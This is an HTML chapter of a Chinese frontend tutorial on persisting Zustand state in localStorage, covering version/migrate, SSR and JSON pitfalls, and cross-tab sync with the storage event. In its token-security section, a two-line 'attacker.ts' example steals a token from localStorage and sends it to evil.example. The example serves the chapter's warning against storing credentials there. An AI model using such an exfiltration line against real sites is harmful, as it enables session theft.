@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>状态持久化与多端同步</title>
+</head>
+<body>
+
+<!-- ═══ 第1站：刷新归零 ═══ -->
+<section class="station reveal" id="s1">
+<div class="station-head"><h2>刷新一下，一切归零</h2></div>
+
+<p>第 18 篇的购物车 store 用着顺手，第 21 篇的注册表单填了一半——按了 F5，全部归零。JS 变量活在内存里，页面刷新等于进程重启。</p>
+
+<p>后端视角看这问题毫不新鲜：Session 放在堆内存里，应用一重启用户集体被踢回登录页——所以有了 Spring Session，把 session 自动持久化到 Redis。前端状态同理：<strong>想跨刷新存活，就得落盘到浏览器提供的存储里</strong>。动机三个：刷新不丢（购物车、草稿、主题偏好）；启动提速（上次的数据先渲染，不白屏等接口）；离线可用（弱网下界面还能工作）。</p>
+
+<p>浏览器给了三个仓库，选型前先看清差异：</p>
+
+<table>
+  <thead>
+    <tr><th>维度</th><th>localStorage</th><th>sessionStorage</th><th>IndexedDB</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>容量</td><td>约 5~10MB</td><td>约 5~10MB</td><td>数百 MB 起</td></tr>
+    <tr><td>生命周期</td><td>永久，手动清除才消失</td><td>标签页会话级，关页即焚</td><td>持久，超出配额可被清理</td></tr>
+    <tr><td>同步 / 异步</td><td>同步，阻塞主线程</td><td>同步</td><td>异步，不阻塞</td></tr>
+    <tr><td>数据形态</td><td>仅字符串</td><td>仅字符串</td><td>结构化对象，可建索引</td></tr>
+    <tr><td>典型用途</td><td>主题、草稿、token（慎）</td><td>一次性会话数据</td><td>离线大数据</td></tr>
+  </tbody>
+</table>
+
+<p>结论先给：<strong>九成场景 localStorage 够用</strong>；sessionStorage 记住「每个标签页各一份」；数据量大或要离线搜索，才升级 IndexedDB。</p>
+
+<div class="crack">
+  <div class="crack-label">后端类比：给浏览器配的三级存储</div>
+  <p>localStorage 像部署在本机的 Redis：单线程读写极快、数据落盘、容量有限只放热数据。sessionStorage 像一次会话的 HttpSession，页面关了就清。IndexedDB 则像内嵌的文档数据库——有索引、能放结构化对象，代价是异步 API 用起来啰嗦。</p>
+</div>
+</section>
+
+<!-- ═══ 第2站：persist 中间件 ═══ -->
+<section class="station reveal" id="s2">
+<div class="station-head"><h2>Zustand persist：两行配置的「自动落盘」</h2></div>
+
+<p>第 18 篇介绍中间件时挖了个坑：version/migrate 迁移与多端同步，本篇展开。先把「两行接入」验完——还用那个购物车 store：</p>
+
+<div class="srcbox">
+  <div class="srcbox-head"><span class="srcbox-file"><b>cartStore.ts</b> · 业务代码零改动，加一层 persist</span></div>
+  <pre><code>import { create } from "zustand";
+import { persist } from "zustand/middleware";
+
+export const useCartStore = create&lt;CartState&gt;()(
+  persist(
+    (set) =&gt; ({
+      items: [],
+      <span class="c">// add / remove / clear 与第 18 篇完全一致，略</span>
+      clear: () =&gt; set({ items: [] }),
+    }),
+    {
+      name: "cart-storage",                <span class="c">// localStorage 里的 key，唯一必填项</span>
+      partialize: (s) =&gt; ({ items: s.items }), <span class="c">// 只挑数据字段落盘</span>
+    }
+  )
+);</code></pre>
+</div>
+
+<p>里面跑的是两条路径（对照图 1）：</p>
+
+<ol>
+  <li><strong>写路径</strong>：每次 set 之后，中间件把 partialize 挑出的状态 <code>JSON.stringify</code>，写进 <code>localStorage["cart-storage"]</code>——就是第 18 篇说过的 AOP 切面，这次切在「状态变更后」。</li>
+  <li><strong>读路径（rehydrate）</strong>：store 创建那一刻，读这个 key、<code>JSON.parse</code>、与初始 state 合并——用户上次的购物车在首帧就回来了。</li>
+</ol>
+
+<figure class="fig">
+<svg viewBox="0 0 620 300" role="img" aria-label="persist 中间件的写路径与读路径（rehydrate）">
+  <defs>
+    <marker id="arr22" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#1C1C1C"/>
+    </marker>
+  </defs>
+
+  <text x="20" y="28" font-size="13" fill="#1C1C1C">写路径：每次 set 之后，自动执行</text>
+
+  <rect x="20" y="42" width="160" height="48" rx="6" fill="#EDE3C4" stroke="#1C1C1C"/>
+  <text x="100" y="62" text-anchor="middle" font-size="12" fill="#1C1C1C">set() 更新内存</text>
+  <text x="100" y="79" text-anchor="middle" font-size="11" fill="#8C8676">业务代码零感知</text>
+
+  <rect x="235" y="42" width="175" height="48" rx="6" fill="#EDE3C4" stroke="#1C1C1C"/>
+  <text x="322" y="62" text-anchor="middle" font-size="12" fill="#1C1C1C">partialize 挑字段</text>
+  <text x="322" y="79" text-anchor="middle" font-size="11" fill="#8C8676">JSON.stringify 序列化</text>
+
+  <rect x="460" y="42" width="140" height="48" rx="6" fill="#FAC94A" stroke="#1C1C1C"/>
+  <text x="530" y="62" text-anchor="middle" font-size="12" fill="#1C1C1C">localStorage</text>
+  <text x="530" y="79" text-anchor="middle" font-size="11" fill="#8C8676">key: cart-storage</text>
+
+  <line x1="180" y1="66" x2="231" y2="66" stroke="#1C1C1C" marker-end="url(#arr22)"/>
+  <line x1="410" y1="66" x2="456" y2="66" stroke="#1C1C1C" marker-end="url(#arr22)"/>
+
+  <line x1="20" y1="128" x2="600" y2="128" stroke="#8C8676" stroke-dasharray="5 5"/>
+
+  <text x="20" y="160" font-size="13" fill="#1C1C1C">读路径：页面加载、store 创建时（rehydrate）</text>
+
+  <rect x="20" y="178" width="160" height="48" rx="6" fill="#EDE3C4" stroke="#1C1C1C"/>
+  <text x="100" y="198" text-anchor="middle" font-size="12" fill="#1C1C1C">create 创建 store</text>
+  <text x="100" y="215" text-anchor="middle" font-size="11" fill="#8C8676">用磁盘数据当初始值</text>
+
+  <rect x="235" y="178" width="175" height="48" rx="6" fill="#FAC94A" stroke="#1C1C1C"/>
+  <text x="322" y="206" text-anchor="middle" font-size="12" fill="#1C1C1C">读 localStorage</text>
+
+  <rect x="460" y="178" width="140" height="48" rx="6" fill="#EDE3C4" stroke="#1C1C1C"/>
+  <text x="530" y="198" text-anchor="middle" font-size="12" fill="#177245">parse + 合并</text>
+  <text x="530" y="215" text-anchor="middle" font-size="11" fill="#8C8676">必要时先走 migrate</text>
+
+  <line x1="180" y1="202" x2="231" y2="202" stroke="#1C1C1C" marker-end="url(#arr22)"/>
+  <line x1="410" y1="202" x2="456" y2="202" stroke="#177245" marker-end="url(#arr22)"/>
+</svg>
+<figcaption class="figcaption"><span class="fig-no">图 1</span>persist 的两条路径：写是 set 后自动序列化落盘，读是启动时 rehydrate 恢复</figcaption>
+</figure>
+
+<p><code>partialize</code> 再强调一次：action 是函数，序列化不了；「抽屉开没开」这类临时 UI 状态也不该跨会话恢复。哪些字段落盘，是使用 persist 时唯一真正要动脑的地方。</p>
+
+<div class="crack">
+  <div class="crack-label">后端类比：Spring Session 的前端镜像</div>
+  <p>Spring Session 的行为：session 一变，自动同步写 Redis；应用重启，从 Redis 恢复。persist 一字不差地复刻了这套流程，只是「Redis」换成了浏览器分给每个站点的 5MB 小仓库，「重启」换成了「刷新页面」。会话持久化这个老问题，前后端给出了同一个答案。</p>
+</div>
+</section>
+
+<!-- ═══ 第3站：version + migrate ═══ -->
+<section class="station reveal" id="s3">
+<div class="station-head"><h2>version + migrate：给持久化加上 schema migration</h2></div>
+
+<p>落盘数据有个尴尬属性：<strong>它是旧代码写的，却要被新代码读</strong>。v1 的购物车条目是 <code>{ id, name, price }</code>，v2 改成 <code>{ id, name, price, quantity }</code>。不做任何处理，老用户的磁盘数据 merge 进来后 <code>quantity</code> 是 undefined，页面上 NaN 满天飞——而且这个 bug 只在老用户机器上出现，你的本地永远复现不出来。</p>
+
+<p>解法就是 persist 的 <code>version</code> + <code>migrate</code>：</p>
+
+<div class="srcbox">
+  <div class="srcbox-head"><span class="srcbox-file"><b>cartStore.ts</b> · 结构变更必须 bump version</span></div>
+  <pre><code>persist(
+  (set) =&gt; ({ /* 同第 2 站，略 */ }),
+  {
+    name: "cart-storage",
+    version: 2, <span class="c">// 当前数据结构版本，改结构就要 +1</span>
+    migrate: (persisted, version) =&gt; {
+      <span class="c">// persisted 是磁盘上的旧数据，类型只能当 unknown 处理</span>
+      if (version &lt; 2) {
+        const old = persisted as { items: { id: number; name: string; price: number }[] };
+        return {
+          <span class="c">// v1 → v2：每个旧条目补上默认数量</span>
+          items: old.items.map((i) =&gt; ({ ...i, quantity: 1 })),
+        };
+      }
+      return persisted as CartState;
+    },
+    partialize: (s) =&gt; ({ items: s.items }),
+  }
+);</code></pre>
+</div>
+
+<p>机制三句话：落盘时把 version 一起存；rehydrate 时对比磁盘与代码的 version，不一致就走 migrate；转换完再合并进初始 state。相等则直接用，零开销。</p>
+
+<div class="crack">
+  <div class="crack-label">后端类比：Flyway / Liquibase</div>
+  <p>version 就是 <code>flyway_schema_history</code> 里的版本号，migrate 函数就是 <code>V2__add_quantity.sql</code>，每次 rehydrate 就是启动时跑一遍迁移检查。纪律也完全一致：version 只增不改；迁移函数从旧版本一路升级到当前版，中间不能跳步。</p>
+</div>
+
+<div class="think">
+  <div class="think-q">改了数据结构却忘了 bump version 会怎样？不报错、静默错位，bug 只在老用户机器上出现。把「改持久化结构必须 bump version + 写 migrate」写进团队 checklist，和「改表必须配迁移脚本」同级。</div>
+</div>
+</section>
+
+<!-- ═══ 第4站：三个陷阱 ═══ -->
+<section class="station reveal" id="s4">
+<div class="station-head"><h2>三个经典陷阱：SSR、序列化、token</h2></div>
+
+<p><strong>陷阱一：SSR 环境没有 window。</strong>localStorage 挂在 <code>window</code> 上，Node 服务端渲染时不存在。persist 内部有守卫自动跳过，但自己写存储代码必须亲手防：</p>
+
+<div class="srcbox">
+  <div class="srcbox-head"><span class="srcbox-file"><b>readStorage.ts</b> · SSR 守卫的标准姿势</span></div>
+  <pre><code>const raw = typeof window !== "undefined"
+  ? window.localStorage.getItem(key)
+  : null; <span class="c">// 服务端没有 localStorage，返回 null 兜底</span></code></pre>
+</div>
+
+<p>还有一层水合问题：服务端渲染的 HTML 里没有本地数据，客户端 rehydrate 后 UI 突然变了，React 会抱怨渲染结果不一致。稳妥做法是首帧先渲染「空态」，挂载后再读存储填充——这个「服务端与客户端对不齐」的母题，第 44 篇 RSC 还会再遇到。</p>
+
+<p><strong>陷阱二：JSON 序列化会偷东西。</strong>localStorage 只能存字符串，persist 底层就是 <code>JSON.stringify</code>。而 JSON 对复杂类型并不友好：</p>
+
+<div class="srcbox">
+  <div class="srcbox-head"><span class="srcbox-file"><b>jsonTrap.ts</b> · 一轮 stringify/parse 之后，各字段惨状不同</span></div>
+  <pre><code>const snapshot = {
+  createdAt: new Date(),      <span class="c">// → 变成 ISO 字符串，读回来不是 Date，没有 getTime 方法</span>
+  cache: new Map([["a", 1]]), <span class="c">// → 变成 {}，数据直接蒸发</span>
+  reload: () =&gt; {},           <span class="c">// → 函数整个消失</span>
+  tag: undefined,             <span class="c">// → 键被直接丢弃</span>
+};
+JSON.parse(JSON.stringify(snapshot)); <span class="c">// 自己跑一遍，眼见为实</span></code></pre>
+</div>
+
+<p>最阴的是 Date：不报错，只是悄悄变成字符串，直到某天你调 <code>createdAt.getTime()</code> 才炸。对策一句话：<strong>持久化字段只放纯数据</strong>（string / number / boolean / 普通对象 / 数组），Date 存时间戳；partialize 是把脏字段挡在门外的第一道闸。</p>
+
+<p><strong>陷阱三：敏感 token 别进 localStorage。</strong>XSS 一旦发生（被污染的第三方依赖、评论区的注入脚本），攻击者偷走凭证只需要一行：</p>
+
+<div class="srcbox">
+  <div class="srcbox-head"><span class="srcbox-file"><b>attacker.ts</b> · 攻击者视角：两行偷走登录态</span></div>
+  <pre><code><span class="c">// localStorage 对同源下的一切 JS 全量敞开</span>
+const token = localStorage.getItem("token");
+fetch("https://evil.example/steal?t=" + token);</code></pre>
+</div>
+
+<p>localStorage 里存 token，等于把家门钥匙放在门口脚垫下——谁路过都能拿。对策：凭证交给 <code>httpOnly</code> Cookie（JS 读不到，自动随请求携带），localStorage 只放「丢了也不心疼」的偏好设置。认证体系的完整攻防，第 35 篇展开。</p>
+
+<div class="crack">
+  <div class="crack-label">后端类比：XSS 之于前端，约等于 SQL 注入之于后端</div>
+  <p>两种病根相同：把「数据」当「代码」执行了。后端的处方是预编译和参数化查询，前端的处方是默认转义加 CSP。但无论防得多严，深度防御的最后一环永远是：别把高价值资产放进「任何脚本能读」的地方——httpOnly 就是那道「脚本读不到」的门，和数据库账号不给应用开 DROP 权限是一个思路。</p>
+</div>
+</section>
+
+<!-- ═══ 第5站：多标签页同步 + 真源 ═══ -->
+<section class="station reveal" id="s5">
+<div class="station-head"><h2>多标签页同步与「持久化不是真源」</h2></div>
+
+<p>最后一个真实场景：用户在 A 标签页退出登录，B 标签页还带着登录态继续下单。浏览器对此有内置机制——<strong>storage 事件</strong>：同源下<strong>其他标签页</strong>修改 localStorage 时会广播事件（修改者自己不触发），天然是跨标签页消息总线。按第 13 篇的路子把它包成 Hook：</p>
+
+<div class="srcbox">
+  <div class="srcbox-head"><span class="srcbox-file"><b>useStorageSync.ts</b> · 读写 + 跨标签页联动的通用 Hook</span></div>
+  <pre><code>import { useEffect, useState } from "react";
+
+export function useStorageSync&lt;T&gt;(key: string, initial: T) {
+  const [value, setValue] = useState&lt;T&gt;(() =&gt; {
+    if (typeof window === "undefined") return initial; <span class="c">// 陷阱一：SSR 守卫</span>
+    const raw = window.localStorage.getItem(key);
+    if (raw === null) return initial;
+    try {
+      return JSON.parse(raw) as T;
+    } catch {
+      return initial; <span class="c">// 磁盘上有脏数据，别让初始化炸掉</span>
+    }
+  });
+
+  useEffect(() =&gt; {
+    const onChange = (e: StorageEvent) =&gt; {
+      if (e.key !== key) return;
+      <span class="c">// 别的标签页改了这个 key：同步进本页 state</span>
+      try {
+        setValue(e.newValue ? (JSON.parse(e.newValue) as T) : initial);
+      } catch {
+        <span class="c">// 脏数据，忽略本次广播</span>
+      }
+    };
+    window.addEventListener("storage", onChange);
+    return () =&gt; window.removeEventListener("storage", onChange); <span class="c">// 退订，第 9 篇的老规矩</span>
+  }, [key, initial]);
+
+  const update = (next: T) =&gt; {
+    setValue(next);
+    window.localStorage.setItem(key, JSON.stringify(next));
+  };
+
+  return [value, update] as const;
+}</code></pre>
+</div>
+
+<p>用法立竿见影：登出时 <code>update(null)</code> 写入「会话已失效」，其他标签页的监听器同时被唤醒，统一跳回登录页——用户在哪个页面退出，全站一起退。主题切换同理。</p>
+
+<p>最后立一条总纲：<strong>持久化是缓存，不是真源</strong>。localStorage 里的购物车只是快照，价格、库存、优惠规则在服务端每时每刻都在变。健康的同步策略是三步：启动先用缓存渲染（秒开）、后台拉取最新数据、冲突以服务端为准。反过来，把接口数据成批镜像进 localStorage，就是第 17 篇警告过的行为——服务端状态的缓存失效、去重、竞态、重试，TanStack Query（第 33 篇）全都造好了轮子，连「先展示后对齐」的乐观更新也一并解决。</p>
+
+<div class="takeaway">
+  <div class="takeaway-label">核心要点</div>
+  <ul>
+    <li>持久化 = 会话落盘 Redis 的前端版；九成场景 localStorage 够用，大数据量升级 IndexedDB。</li>
+    <li>Zustand persist：set 后自动序列化落盘 + 启动 rehydrate，name 与 partialize 两行接入，业务零改动。</li>
+    <li>改持久化结构必须 bump version + 写 migrate——前端版 Flyway，忘 bump 只坑老用户。</li>
+    <li>三陷阱：SSR 先判 <code>typeof window</code>；JSON 会偷走 Date / Map / 函数，只持久化纯数据；token 交给 httpOnly Cookie，别进 localStorage。</li>
+    <li>storage 事件做跨标签页同步（别的页才收得到）；持久化是缓存不是真源，最终以服务端为准。</li>
+  </ul>
+</div>
+
+<div class="recap">
+  <h3>本章回顾</h3>
+  <p>卷三就此收官：第 17 篇把状态分门别类，第 18、19 篇给出两种客户端状态容器，第 20 篇完成选型，第 21 篇收服表单，这一篇把状态钉进磁盘、连进多端。「状态」这条线走完了。下一卷谈：状态之外，<strong>组件本身怎么组织才不会长成怪物</strong>。第 23 篇，从一条你在 Java 里背过、也翻过车的原则说起：组合优于继承。</p>
+</div>
+</section>
+
+</body>
+</html>
